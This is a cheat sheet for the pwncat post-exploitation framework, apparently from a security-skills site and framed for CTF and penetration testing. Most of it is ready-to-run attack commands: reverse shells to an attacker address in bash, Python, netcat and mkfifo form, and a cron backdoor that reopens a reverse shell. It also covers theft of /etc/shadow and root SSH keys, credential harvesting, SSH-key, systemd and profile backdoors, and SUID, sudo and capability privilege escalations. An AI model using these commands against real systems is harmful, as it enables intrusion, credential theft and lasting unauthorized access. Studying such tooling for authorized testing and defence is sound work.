# pwncat advanced

## Overview

pwncat is a post-exploitation framework that transforms reverse shell interactions into an automated exploitation platform. It provides enumeration, privilege escalation, and persistence capabilities against Linux and Windows targets.

**Key Features:**

- Automated target enumeration and privilege escalation vectors

- Interactive reverse shell handler with local/remote command execution

- File transfer, persistence implants, and tamper tracking

- Module system for custom exploitation logic

- Multi-session channel management

- CTF and pentest-optimized workflows

## Installation

```bash
# Install from PyPI
pip install pwncat-caleb

# Install from source (development)
git clone https://github.com/calebstewart/pwncat.git
cd pwncat
pip install -e .

# Update existing installation
pip install --upgrade pwncat-caleb

# Verify installation
pwncat --version
```

## Basic Usage

### Starting a Listener

```bash
# Bind listener (wait for incoming reverse shells)
pwncat -l -p 4444

# Bind on specific interface
pwncat -l -p 4444 -H 192.168.1.100

# Listen with specific socket type (socket/ssl)
pwncat -l -p 4444 --socket-type socket

# Verbose output
pwncat -l -p 4444 -v
```

### Connecting to a Target

```bash
# Connect to existing shell
pwncat -c 192.168.1.50:4444

# Connect with specific socket type
pwncat -c 192.168.1.50:4444 --socket-type socket
```

## Reverse Shell Setup

### Generate Payload from Target

```bash
# Bash reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc/ncat reverse shell
nc -e /bin/sh 192.168.1.100 4444

# mkfifo method
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f
```

## Interactive Shell Commands

### Local Commands (Executed on Attacker)

```bash
# Run local shell command
local whoami
local ls -la
local id

# List all local commands
help local
```

### Remote Commands (Executed on Target)

```bash
# Run remote command
whoami
id
pwd
ls -la /

# View environment variables
env

# Check current user and groups
id
groups
```

### Shell Navigation

```bash
# Change remote working directory
cd /tmp
cd ~

# Display remote working directory
pwd

# Exit pwncat session
exit
quit
```

## File Transfer

### Upload Files to Target

```bash
# Upload single file
upload /path/to/local/file /tmp/remote_file

# Upload with verbose output
upload -v /path/to/script.sh /opt/script.sh

# Upload and execute
upload /tmp/exploit.py /dev/shm/exploit.py
remote python3 /dev/shm/exploit.py
```

### Download Files from Target

```bash
# Download single file
download /etc/passwd ./passwd

# Download multiple files
download /etc/shadow ./shadow
download /root/.ssh/id_rsa ./id_rsa

# Download with absolute path
download /var/www/html/config.php ./config.php
```

## Enumeration Modules

### View Available Modules

```bash
# List all enumeration modules
modules

# List modules by category
modules | grep -i privilege
modules | grep -i persistence

# View module details
help <module_name>
```

### Run Enumeration

```bash
# Enumerate all target information
enumerate

# Enumerate specific aspect
enumerate suid
enumerate capabilities
enumerate sudo

# Enumerate Windows target
enumerate windows
enumerate scheduled_tasks
enumerate registry
```

### Common Enumeration Results

```bash
# SUID binaries with escalation potential
suid

# Sudo rules
sudo

# Writable files and directories
writable

# Kernel vulnerabilities
kernel

# Cron jobs and scheduled tasks
cron
```

## Privilege Escalation

### Identify Escalation Vectors

```bash
# Search for privilege escalation methods
escalate list

# Get detailed escalation info
escalate list --verbose

# Check specific method
escalate list --technique suid
escalate list --technique sudo
escalate list --technique capability
```

### Execute Privilege Escalation

```bash
# Auto-escalate (attempt best vector)
escalate auto

# Escalate with specific technique
escalate technique suid

# Escalate via sudo
escalate technique sudo

# Escalate via capability
escalate technique capability

# Escalate and verify
escalate auto
id

# Escalate with verbose output
escalate auto -v
```

### Manual Escalation Methods

```bash
# Check sudo privileges
sudo -l

# SUID binary exploitation
find / -perm -4000 2>/dev/null
/path/to/suid_binary

# Writable script in PATH
echo "malicious_code" > /tmp/vulnerable_script

# Cron job exploitation
cat /var/spool/cron/crontabs/*

# Capability escalation
getcap -r / 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Persistence

### Install Persistence Mechanisms

```bash
# Install persistence implant
persist install

# View available persistence methods
persist list

# Install specific persistence type
persist install --technique cron
persist install --technique ssh_key
persist install --technique systemd

# Persistence with custom command
persist install --technique cron --command "bash -i >& /dev/tcp/192.168.1.100/5555 0>&1"
```

### Manage Persistence

```bash
# List installed persistence
persist list

# Remove persistence implant
persist remove <implant_id>

# Verify persistence is working
persist verify
```

### Persistence Techniques

```bash
# SSH key backdoor
persist install --technique ssh_key

# Cron job backdoor
persist install --technique cron --frequency "*/5 * * * *"

# systemd service
persist install --technique systemd

# Bash profile modification
persist install --technique bash_profile

# Shell login script
persist install --technique shell
```

## Channel Management

### Multiple Sessions

```bash
# List active channels
channels

# Switch to different channel
channel 1
channel 2

# Create new session on current target
session new

# Background current session
bg

# Foreground session
fg
```

### Session Information

```bash
# View session details
info

# Show all open connections
channels -v

# Monitor channel activity
monitor
```

## Tamper Tracking

### Track Modifications

```bash
# View tamper log
tamper

# Check modified files
tamper list

# View specific tamper entry
tamper show <entry_id>

# Clear tamper history
tamper clear
```

## Advanced Features

### Backdoor Management

```bash
# Install and manage backdoors
backdoor install

# View installed backdoors
backdoor list

# Remove backdoor
backdoor remove <id>
```

### Password and Credential Harvesting

```bash
# Search for credential files
search /home -name "*password*" -o -name "*creds*" -o -name "*key*"

# Extract bash history
cat ~/.bash_history

# Check SSH keys
ls -la ~/.ssh

# View sudo history
cat /var/log/auth.log | grep sudo
```

### System Information Gathering

```bash
# Kernel version
uname -a

# Distribution info
cat /etc/os-release

# Installed packages
dpkg -l  # Debian/Ubuntu
rpm -qa  # RHEL/CentOS

# Network configuration
ip addr
ip route
netstat -tulpn
ss -tulpn

# Services running
systemctl list-units --type=service
ps aux
```

## Windows Target Support

### Windows-Specific Enumeration

```bash
# Enumerate Windows system
enumerate windows

# Check Windows privileges
whoami /priv

# List scheduled tasks
tasklist
Get-ScheduledTask

# Check UAC status
Get-ItemProperty REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Network information
ipconfig /all
netstat -ano
```

### Windows Escalation

```bash
# Find Windows escalation vectors
escalate list

# Exploit Windows vulnerability
escalate auto

# Manual methods
# Check for unquoted service paths
wmic service list brief
# Check DLL hijacking opportunities
# Check registry permissions
```

## CTF Workflows

### Capture-The-Flag Enumeration

```bash
# Quick target assessment
enumerate

# Find flags
search / -name "*flag*" 2>/dev/null
search / -name "*flag.txt" 2>/dev/null

# Search home directories
ls -la /home/*/
cat /home/*/flag.txt

# Check web directories
ls -la /var/www/html/
cat /var/www/html/flag.txt

# Search common CTF locations
ls /tmp
ls /dev/shm
ls /opt
```

### Flag Exfiltration

```bash
# Download captured flags
download /home/user/flag.txt ./flag.txt

# Read and display
cat flag.txt

# Verify flag format
cat flag.txt | xxd
```

## Pentest Workflows

### Full Exploitation Chain

```bash
# 1. Gain initial shell
pwncat -l -p 4444

# 2. Enumerate target
enumerate

# 3. Find escalation path
escalate list

# 4. Escalate privileges
escalate auto

# 5. Install persistence
persist install

# 6. Exfiltrate data
download /etc/shadow ./shadow
download /root/.ssh/id_rsa ./root_key

# 7. Verify persistence
exit
# Reconnect to verify persistence works
```

### Post-Exploitation Checklist

```bash
# Enumerate system
enumerate

# Check privilege level
id
whoami

# Identify escalation opportunities
escalate list

# Attempt privilege escalation
escalate auto

# Verify root access
id
cat /etc/shadow

# Install persistence
persist install

# Harvest credentials
cat ~/.bash_history
find /home -name "*.pem" -o -name "*.key"

# Document findings
local echo "Root achieved" >> report.txt
download /etc/passwd ./passwd
download /etc/group ./group
```

## Troubleshooting

### Connection Issues

```bash
# Test reverse shell command
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Check listener is running
netstat -tulpn | grep 4444

# Verify firewall rules
sudo iptables -L
sudo ufw status

# Use alternative ports
pwncat -l -p 5555
```

### Enumeration Failures

```bash
# Run with verbose output
enumerate -v

# Check target OS type
uname -a

# Verify required tools on target
which python3
which curl
which wget

# Manual enumeration fallback
find / -perm -4000 2>/dev/null
sudo -l
```

### Module Errors

```bash
# Reload modules
modules reload

# Check module compatibility
modules --filter linux
modules --filter windows

# Run specific module debug
escalate list -v
```

## Common Exploits

### SUID Binary Exploitation

```bash
# Find SUID binaries
suid

# Check specific binary
/usr/bin/find -exec /bin/bash \; -quit

# Escalate with GTFOBins techniques
/usr/bin/vim -c ':!/bin/bash'
/usr/bin/less '!bash'
```

### Sudo Privilege Abuse

```bash
# Check sudo permissions
sudo -l

# Exploit NOPASSWD
sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"

# Exploit wildcard
sudo /bin/chown -R user:user /path/*
```

### Capability Escalation

```bash
# Find capabilities
getcap -r / 2>/dev/null

# Exploit python capability
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploit perl capability
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); system("/bin/bash")'
```

## Tips & Tricks

- Use `enumerate` first to identify all available escalation vectors

- Check `escalate list` before attempting `escalate auto` to understand methods

- Always install persistence after obtaining root for lab environments

- Use `channels` to manage multiple target sessions simultaneously

- Set verbose flags (`-v`) when debugging connection issues

- Download sensitive files (`/etc/shadow`, `/etc/passwd`, SSH keys) for offline analysis

- Test persistence mechanisms before disconnecting from target

- Use local commands for post-exploitation documentation and reporting

- Monitor tamper logs to avoid leaving obvious traces

- Combine pwncat with other tools (Metasploit, custom scripts) via upload/download functionality

## Resources

- Official GitHub: [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)

- Documentation: [https://pwncat.readthedocs.io](https://pwncat.readthedocs.io)

- GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io) (binary exploitation reference)

- LOLBAS: [https://lolbas-project.github.io](https://lolbas-project.github.io) (Windows equivalent)

Source: https://1337skills.com/cheatsheets/pwncat/
